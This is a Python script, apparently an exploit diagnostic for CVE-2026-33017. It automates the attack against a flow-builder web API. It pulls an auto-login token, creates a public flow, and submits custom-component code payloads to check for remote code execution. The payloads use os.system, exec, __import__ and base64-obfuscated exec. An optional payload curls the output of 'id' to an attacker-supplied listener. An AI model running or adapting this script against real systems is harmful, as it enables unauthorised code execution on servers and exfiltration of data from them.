#!/usr/bin/env python3
"""Diagnostic complet pour CVE-2026-33017 - HACKFUT"""

import json
import sys
import uuid
import requests


def test_variant(base_url, token, flow_id, variant_name, payload):
    """Teste une variante de payload avec diagnostic robuste."""
    print(f"\n{'='*60}")
    print(f"  Test: {variant_name}")
    print(f"{'='*60}")
    
    client_id = str(uuid.uuid4())
    endpoint = f"{base_url}/api/v1/build_public_tmp/{flow_id}/flow"
    
    headers = {
        "Content-Type": "application/json",
        "Authorization": f"Bearer {token}",
    }
    
    try:
        resp = requests.post(
            endpoint, json=payload,
            cookies={"client_id": client_id},
            headers=headers, timeout=15,
        )
        print(f"  POST: HTTP {resp.status_code}")
        
        if resp.status_code not in (200, 201):
            print(f"  Response: {resp.text[:300]}")
            return False
        
        try:
            data = resp.json()
        except ValueError:
            print(f"  Non-JSON: {resp.text[:300]}")
            return False
        
        if not isinstance(data, dict):
            print(f"  Response is not dict: {data}")
            return False
        
        job_id = data.get("job_id")
        if not job_id:
            print(f"  No job_id: {data}")
            return False
        
        print(f"  Job ID: {job_id}")
        
        events_url = f"{base_url}/api/v1/build/{job_id}/events"
        print(f"  Polling events...")
        
        raw_lines = []
        valid_result = None
        
        try:
            with requests.get(
                events_url,
                headers={"Accept": "application/x-ndjson",
                         "Authorization": f"Bearer {token}"},
                cookies={"client_id": client_id},
                stream=True, timeout=15,
            ) as r:
                for line in r.iter_lines():
                    if not line:
                        continue
                    if isinstance(line, bytes):
                        line = line.decode("utf-8", errors="replace")
                    
                    raw_lines.append(line)
                    
                    try:
                        evt = json.loads(line)
                    except (json.JSONDecodeError, ValueError):
                        print(f"  [RAW] {line[:150]}")
                        continue
                    
                    if not isinstance(evt, dict):
                        print(f"  [NON-DICT] {str(evt)[:150]}")
                        continue
                    
                    event_type = evt.get("event")
                    
                    if event_type in ("end_vertex", "error", "exception"):
                        print(f"  [{event_type}]")
                        
                        data_field = evt.get("data")
                        
                        if not isinstance(data_field, dict):
                            if data_field:
                                print(f"    DATA(str): {str(data_field)[:200]}")
                            continue
                        
                        bd = data_field.get("build_data")
                        if isinstance(bd, dict):
                            valid = bd.get("valid")
                            if valid is not None:
                                print(f"    valid: {valid}")
                                valid_result = valid
                            
                            errors = bd.get("error", [])
                            if isinstance(errors, list):
                                for err in errors[:3]:
                                    print(f"    ERROR: {str(err)[:200]}")
                            
                            messages = bd.get("message", [])
                            if isinstance(messages, list):
                                for msg in messages[:3]:
                                    print(f"    MSG: {str(msg)[:200]}")
                        
                        logs = data_field.get("logs")
                        if isinstance(logs, dict):
                            for msg_key, msg_val in logs.items():
                                if isinstance(msg_val, list):
                                    for m in msg_val[:2]:
                                        print(f"    LOG[{msg_key}]: {str(m)[:150]}")
        
        except requests.RequestException as e:
            print(f"  Poll error: {e}")
        
        if valid_result is True:
            print(f"  ✅ BUILD VALID")
            return True
        elif valid_result is False:
            print(f"  ❌ BUILD INVALID")
            return False
        else:
            print(f"  ⚠️ Build unknown ({len(raw_lines)} events)")
            if raw_lines:
                print(f"  Last: {raw_lines[-1][:300]}")
            return None
    
    except Exception as e:
        print(f"  Fatal: {e}")
        import traceback
        traceback.print_exc()
        return False


def main():
    if len(sys.argv) < 2:
        print("Usage: python diagnose.py http://target:port [listener_url]")
        print("  listener_url: http://YOUR_IP:PORT (for callback test)")
        sys.exit(1)
    
    base_url = sys.argv[1].rstrip("/")
    listener_url = sys.argv[2] if len(sys.argv) > 2 else None
    
    # ═══ 1. Version ═══
    print(f"\n[1] Version:")
    try:
        r = requests.get(f"{base_url}/api/v1/version", timeout=10)
        print(f"    {r.text[:300]}")
    except Exception as e:
        print(f"    Error: {e}")
    
    # ═══ 2. Token ═══
    print(f"\n[2] auto_login:")
    token = None
    try:
        r = requests.get(f"{base_url}/api/v1/auto_login", timeout=10)
        data = r.json()
        if isinstance(data, dict):
            token = data.get("access_token")
        print(f"    Token: {token[:40] if token else 'NONE'}...")
    except Exception as e:
        print(f"    Error: {e}")
    
    if not token:
        print(f"    No token - cannot proceed")
        return
    
    # ═══ 3. Create flow ═══
    print(f"\n[3] Creating flow:")
    flow_id = None
    try:
        body = {
            "name": f"diag-{uuid.uuid4().hex[:6]}",
            "data": {"nodes": [], "edges": [], "viewport": {}},
            "access_type": "PUBLIC",
        }
        r = requests.post(
            f"{base_url}/api/v1/flows/",
            json=body,
            headers={"Authorization": f"Bearer {token}",
                     "Content-Type": "application/json"},
            timeout=10,
        )
        data = r.json()
        if isinstance(data, dict):
            flow_id = data.get("id")
        print(f"    Flow ID: {flow_id}")
    except Exception as e:
        print(f"    Error: {e}")
        return
    
    if not flow_id:
        return
    
    # ═══ 4. Test empty flow (baseline) ═══
    test_variant(
        base_url, token, flow_id,
        "EMPTY FLOW (baseline)",
        {"data": {"nodes": [], "edges": [], "viewport": {}}},
    )
    
    # ═══ 5. Test simple print ═══
    node_id = str(uuid.uuid4())
    test_variant(
        base_url, token, flow_id,
        "SIMPLE PRINT",
        {
            "data": {
                "nodes": [{
                    "id": node_id,
                    "type": "genericNode",
                    "position": {"x": 0, "y": 0},
                    "data": {
                        "type": "CustomComponent",
                        "id": node_id,
                        "node": {
                            "template": {
                                "_type": "CustomComponent",
                                "code": {
                                    "value": "print('HELLO')",
                                    "type": "code"
                                }
                            }
                        }
                    }
                }],
                "edges": [],
                "viewport": {"x": 0, "y": 0, "zoom": 1}
            }
        },
    )
    
    # ═══ 6. Test os.system ═══
    node_id2 = str(uuid.uuid4())
    callback_cmd = "id"
    if listener_url:
        callback_cmd = f"curl {listener_url}/test_$(id|base64 -w0)"
    
    test_variant(
        base_url, token, flow_id,
        "OS.SYSTEM",
        {
            "data": {
                "nodes": [{
                    "id": node_id2,
                    "type": "genericNode",
                    "position": {"x": 0, "y": 0},
                    "data": {
                        "type": "CustomComponent",
                        "id": node_id2,
                        "node": {
                            "template": {
                                "_type": "CustomComponent",
                                "code": {
                                    "value": f"import os\nos.system({repr(callback_cmd)})",
                                    "type": "code"
                                }
                            }
                        }
                    }
                }],
                "edges": [],
                "viewport": {"x": 0, "y": 0, "zoom": 1}
            }
        },
    )
    
    # ═══ 7. Test exec() with print ═══
    node_id3 = str(uuid.uuid4())
    test_variant(
        base_url, token, flow_id,
        "EXEC PRINT",
        {
            "data": {
                "nodes": [{
                    "id": node_id3,
                    "type": "genericNode",
                    "position": {"x": 0, "y": 0},
                    "data": {
                        "type": "CustomComponent",
                        "id": node_id3,
                        "node": {
                            "template": {
                                "_type": "CustomComponent",
                                "code": {
                                    "value": "exec('print(\"EXEC_WORKED\")')",
                                    "type": "code"
                                }
                            }
                        }
                    }
                }],
                "edges": [],
                "viewport": {"x": 0, "y": 0, "zoom": 1}
            }
        },
    )
    
    # ═══ 8. Test __import__ ═══
    node_id4 = str(uuid.uuid4())
    test_variant(
        base_url, token, flow_id,
        "__IMPORT__ OS",
        {
            "data": {
                "nodes": [{
                    "id": node_id4,
                    "type": "genericNode",
                    "position": {"x": 0, "y": 0},
                    "data": {
                        "type": "CustomComponent",
                        "id": node_id4,
                        "node": {
                            "template": {
                                "_type": "CustomComponent",
                                "code": {
                                    "value": "__import__('os').system('id')",
                                    "type": "code"
                                }
                            }
                        }
                    }
                }],
                "edges": [],
                "viewport": {"x": 0, "y": 0, "zoom": 1}
            }
        },
    )
    
    # ═══ 9. Test base64 obfuscation ═══
    node_id5 = str(uuid.uuid4())
    test_variant(
        base_url, token, flow_id,
        "BASE64 + EXEC",
        {
            "data": {
                "nodes": [{
                    "id": node_id5,
                    "type": "genericNode",
                    "position": {"x": 0, "y": 0},
                    "data": {
                        "type": "CustomComponent",
                        "id": node_id5,
                        "node": {
                            "template": {
                                "_type": "CustomComponent",
                                "code": {
                                    "value": "exec(__import__('base64').b64decode('aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2lkJyk='))",
                                    "type": "code"
                                }
                            }
                        }
                    }
                }],
                "edges": [],
                "viewport": {"x": 0, "y": 0, "zoom": 1}
            }
        },
    )
    
    # Cleanup
    try:
        requests.delete(
            f"{base_url}/api/v1/flows/{flow_id}",
            headers={"Authorization": f"Bearer {token}"},
            timeout=10,
        )
        print(f"\n[*] Flow {flow_id} deleted")
    except Exception:
        pass


if __name__ == "__main__":
    main()